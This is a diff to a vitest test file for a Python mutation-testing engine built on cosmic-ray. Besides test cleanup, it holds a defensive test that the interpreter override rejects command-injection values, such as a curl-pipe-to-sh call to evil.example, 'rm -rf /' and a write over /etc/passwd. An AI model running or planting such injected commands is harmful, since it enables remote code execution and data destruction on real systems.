@@ -18,7 +18,7 @@ import { writeFileSync } from 'node:fs';
 import { runShell } from '../utils/exec.js';
 import { ExecFailureError } from '../utils/exec-error.js';
 import { isCancel } from '../utils/cancel.js';
-import { PythonEngine, parseCosmicRayDump, _resetInterpreterCache } from '../engines/python.js';
+import { PythonEngine, parseCosmicRayDump } from '../engines/python.js';
 
 const mockRunShell = vi.mocked(runShell);
 const mockWriteFileSync = vi.mocked(writeFileSync);
@@ -96,12 +96,10 @@ describe('PythonEngine (cosmic-ray)', () => {
     // Pin the interpreter so the generated test-command is deterministic
     // regardless of whether the host has `python` or only `python3`.
     process.env.CHAOS_MCP_PYTHON = 'python';
-    _resetInterpreterCache();
     engine = new PythonEngine();
   });
   afterEach(() => {
     delete process.env.CHAOS_MCP_PYTHON;
-    _resetInterpreterCache();
   });
 
   it('runs baseline → init → exec → dump and parses the result', async () => {
@@ -118,6 +116,11 @@ describe('PythonEngine (cosmic-ray)', () => {
     expect(result.survived).toBe(1);
     expect(result.totalMutants).toBe(2);
     expect(result.mutationScore).toBe('50.00%');
+    // cosmic-ray mutates whole modules; the report says so structurally rather
+    // than letting consumers read it off the absence of a scope note — which a
+    // diffBase run acquires (handler.ts) and which the transitional
+    // `scopeKind === undefined && !scopeNote` fallback then misreads as scoping.
+    expect(result.scopeKind).toBe('whole-file');
     expect(result.vulnerabilities[0]).toMatchObject({
       line: 73,
       mutator: 'core/ReplaceBinaryOperator_Add_Sub',
@@ -289,14 +292,12 @@ describe('PythonEngine (cosmic-ray)', () => {
     delete process.env.CHAOS_MCP_PYTHON;
     const savedPath = process.env.PATH;
     process.env.PATH = '';
-    _resetInterpreterCache();
     try {
       queueRun('');
       await engine.run('m.py', { workDir: '/tmp/sandbox' });
       expect(lastConfig()).toContain('test-command = "python3 -m pytest -x -q"');
     } finally {
       process.env.PATH = savedPath;
-      _resetInterpreterCache();
     }
   });
 
@@ -325,14 +326,12 @@ describe('PythonEngine (cosmic-ray)', () => {
     delete process.env.CHAOS_MCP_PYTHON;
     const savedPath = process.env.PATH;
     process.env.PATH = binDir;
-    _resetInterpreterCache();
     try {
       queueRun('');
       await engine.run('m.py', { workDir: '/tmp/sandbox' });
       expect(lastConfig()).toContain('test-command = "python -m pytest -x -q"');
     } finally {
       process.env.PATH = savedPath;
-      _resetInterpreterCache();
       realFs.rmSync(binDir, { recursive: true, force: true });
     }
   });
@@ -351,7 +350,6 @@ describe('PythonEngine (cosmic-ray)', () => {
     const savedPath = process.env.PATH;
     process.env.PATH = binDir;
     process.env.CHAOS_MCP_PYTHON = '  /opt/venv/bin/python3.12  ';
-    _resetInterpreterCache();
     try {
       queueRun('');
       await engine.run('m.py', { workDir: '/tmp/sandbox' });
@@ -361,7 +359,6 @@ describe('PythonEngine (cosmic-ray)', () => {
     } finally {
       process.env.PATH = savedPath;
       delete process.env.CHAOS_MCP_PYTHON;
-      _resetInterpreterCache();
       realFs.rmSync(binDir, { recursive: true, force: true });
     }
   });
@@ -373,7 +370,6 @@ describe('PythonEngine (cosmic-ray)', () => {
     const savedPath = process.env.PATH;
     process.env.PATH = '';
     process.env.CHAOS_MCP_PYTHON = '   ';
-    _resetInterpreterCache();
     try {
       queueRun('');
       await engine.run('m.py', { workDir: '/tmp/sandbox' });
@@ -381,17 +377,17 @@ describe('PythonEngine (cosmic-ray)', () => {
     } finally {
       process.env.PATH = savedPath;
       delete process.env.CHAOS_MCP_PYTHON;
-      _resetInterpreterCache();
     }
   });
 
   describe('CHAOS_MCP_PYTHON validation', () => {
     // The override is string-concatenated into `${interpreter} -m pytest -x -q`
     // and written into the cosmic-ray config as `test-command`, which cosmic-ray
-    // executes THROUGH A SHELL once per mutant. Its doc comment called it
-    // "deterministic, used by tests" and nothing enforced that: the elaborate
-    // BARE_EXECUTABLE_RE / isRepoTestCommandAllowed gate guarded the RUNNER half
-    // of the command and left the INTERPRETER half wide open.
+    // word-splits with `shlex.split` and runs as argv — no shell — once per
+    // mutant. Its doc comment called it "deterministic, used by tests" and
+    // nothing enforced that: the elaborate BARE_EXECUTABLE_RE /
+    // isRepoTestCommandAllowed gate guarded the RUNNER half of the command and
+    // left the INTERPRETER half wide open.
     it.each([
       ['python3; curl http://evil.example | sh #'],
       ['python3 && rm -rf /'],
@@ -400,7 +396,7 @@ describe('PythonEngine (cosmic-ray)', () => {
       ['`id`'],
       ['python3 > /etc/passwd'],
       ['../../relative/python3'],
-    ])('refuses the shell-bearing override %j', async (override) => {
+    ])('refuses the unsafe override %j', async (override) => {
       process.env.CHAOS_MCP_PYTHON = override;
       const fresh = new PythonEngine();
       await expect(fresh.run('m.py', { workDir: '/tmp/sandbox' })).rejects.toThrow(
@@ -1194,14 +1190,12 @@ describe('PythonEngine (cosmic-ray)', () => {
     delete process.env.CHAOS_MCP_PYTHON;
     const savedPath = process.env.PATH;
     process.env.PATH = binDir;
-    _resetInterpreterCache();
     try {
       queueRun('');
       await engine.run('m.py', { workDir: '/tmp/sandbox' });
       expect(lastConfig()).toContain('test-command = "python3 -m pytest -x -q"');
     } finally {
       process.env.PATH = savedPath;
-      _resetInterpreterCache();
       realFs.rmSync(binDir, { recursive: true, force: true });
     }
   });
